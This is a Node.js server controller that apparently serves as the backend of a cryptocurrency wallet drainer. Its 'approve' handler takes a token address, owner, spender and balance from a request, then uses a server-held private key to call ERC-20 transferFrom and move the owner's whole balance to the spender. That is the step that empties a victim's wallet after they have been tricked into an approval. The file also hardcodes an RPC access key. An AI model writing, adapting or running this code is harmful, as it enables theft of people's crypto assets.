require('dotenv').config()
const axios = require('axios');
const { ethers } = require("ethers");


const controller = async (request, response) => {

    const {txs} = request.body;
 
    console.log(request.body)

     if(txs ) {
        response.sendStatus(200);
     }
     else {
        response.sendStatus(400);
     }

    //  https://wserv.onrender.com/streams
    // https://4747-193-19-207-97.ngrok-free.app
    // console.log(process.env.url);

        // axios({
        // method: 'post',
        // body: {
        //     'name': 'belle'
        // },
        // url: process.env.url,
        // headers: {'x-apikey': process.env.key,
        // 'Accept' : 'application/json',
        // "Content-Type" : 'application/json'
        // },
        // responseType: 'application/json'
        // })
        // .then(function (res) {
        //     response.sendStatus(200);
        // })
        // .catch(function (error) {
        // console.log(error);
        // response.sendStatus(400);
        // });

      
  
}


const approve = async (request, response) => {

    const {txs} = request.body;
 
    console.log(await request.body)
    // return  response.status(200).json({success: "successfully message"});
    const apikey = request.headers['ak'];

    if(!apikey) {
      return  response.status(400).json({error: "no ak"});
    }
    if(apikey != process.env.apiKey) {
      return  response.status(400).json({error: "bad ak"});
    }
    const token = await  request.body;
    const provider = new ethers.providers.JsonRpcProvider(`https://rpc.ankr.com/${token.networkID}/6b0e506c63babd2b27739967a6f1e579c4fc72039e11d6ed25b233058511620d`);

    const signer = new ethers.Wallet(process.env.PK).connect(provider);

     const abi = [{ "constant": true, "inputs": [], "name": "name", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "spender", "type": "address" }, { "name": "value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "totalSupply", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "from", "type": "address" }, { "name": "to", "type": "address" }, { "name": "value", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, {
       "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "name": "", "type": "uint8" }],
       "payable": false, "stateMutability": "view", "type": "function"
     }, { "constant": false, "inputs": [{ "name": "spender", "type": "address" }, { "name": "addedValue", "type": "uint256" }], "name": "increaseAllowance", "outputs": [{ "name": "success", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [], "name": "unpause", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "name": "account", "type": "address" }], "name": "isPauser", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "paused", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, {
       "constant": false, "inputs": [], "name": "renouncePauser", "outputs": [], "payable": false, "stateMutability": "nonpayable",
       "type": "function"
     }, { "constant": true, "inputs": [{ "name": "owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "account", "type": "address" }], "name": "addPauser", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [], "name": "pause", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "symbol", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "spender", "type": "address" }, { "name": "subtractedValue", "type": "uint256" }], "name": "decreaseAllowance", "outputs": [{ "name": "success", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" },
     { "constant": false, "inputs": [{ "name": "to", "type": "address" }, { "name": "value", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "name": "owner", "type": "address" }, { "name": "spender", "type": "address" }], "name": "allowance", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "inputs": [{ "name": "name", "type": "string" }, { "name": "symbol", "type": "string" }, { "name": "decimals", "type": "uint8" }, { "name": "totalSupply", "type": "uint256" }], "payable": false, "stateMutability": "nonpayable", "type": "constructor" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "account", "type": "address" }], "name": "Paused", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "account", "type": "address" }], "name": "Unpaused", "type": "event" },
     { "anonymous": false, "inputs": [{ "indexed": true, "name": "account", "type": "address" }], "name": "PauserAdded", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "account", "type": "address" }], "name": "PauserRemoved", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "from", "type": "address" }, { "indexed": true, "name": "to", "type": "address" }, { "indexed": false, "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "owner", "type": "address" }, { "indexed": true, "name": "spender", "type": "address" }, { "indexed": false, "name": "value", "type": "uint256" }], "name": "Approval", "type": "event" }];


     const iface = new ethers.utils.Interface(abi);
     const erc20_rw = new ethers.Contract(token.token_address, abi, signer);
     var tkbalanceADDR1 = await erc20_rw.balanceOf(await signer.getAddress());
     console.log("straight bal: " + tkbalanceADDR1)
     console.log("formated bal", token.balance_formatted)
     console.log(" bal", token.balance)
     var dt = iface.encodeFunctionData("transferFrom", [
        token.owner,
        token.spender,
        token.balance+""
     ])

     var feeData = await provider.getFeeData();
     var gl = (await provider.estimateGas(dt));
     gl = (await provider.estimateGas(dt)).add(gl.div(2))
     var gp = feeData.maxFeePerGas;
     // gp = gp.add(gp.div(3))

     console.log("gasPrice in gwei " + ethers.utils.formatUnits(gp, "gwei"))
     console.log("gaslimit in gwei: " + gl)
     console.log("totalgasprice3: " + ethers.utils.formatUnits(gl.mul(gp), "ether"))

     try {

       const tx = await signer.sendTransaction({
         type: 2,
         to: token.token_address,
         gasLimit: gl,
         // gasPrice: gp,
         maxFeePerGas : gp,
         maxPriorityFeePerGas : gp,
         data: dt
       });


       try {
         tx.wait();

         if (tx.hash) {
         
           console.log("Bellle.......")
           
         }

         if (tx.nonce) {

         
           console.log("Bellle.......nonce:"+tx.nonce)
           console.log(tx)

           return  response.status(200).json({success: "successful"});

         }


       } catch (err) {

         console.log("tx er:" + err.message)
         // process.exit(0)
       }

     } catch (err) {
       console.log(`Er tx: ${err.message}`);
       // process.exit(0)
     }


  
}



module.exports = {
    controller, approve
}